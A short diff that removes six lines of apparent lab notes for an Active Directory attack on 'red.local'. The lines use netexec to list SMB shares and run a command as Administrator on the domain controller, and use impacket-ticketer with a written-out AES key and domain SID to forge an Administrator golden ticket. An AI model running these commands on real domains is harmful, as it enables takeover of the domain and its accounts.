@@ -1,6 +1,0 @@
-export KRB5CCNAME=$(pwd)/wonka.ccache
-
-netexec smb dc.red.local -u wonka --use-kcache --kdcHost dc.red.local --shares
-
-netexec smb dc.red.local -u Administrator --use-kcache --kdcHost dc.red.local -X "ls"
-impacket-ticketer -aesKey 02931d602c09d4bca3994c71104049fe570a2515e0bdc2cdef9a20fe0fbc4155 -domain-sid S-1-5-21-1987383405-516201838-2894712208 -domain red.local -user-id 500 Administrator
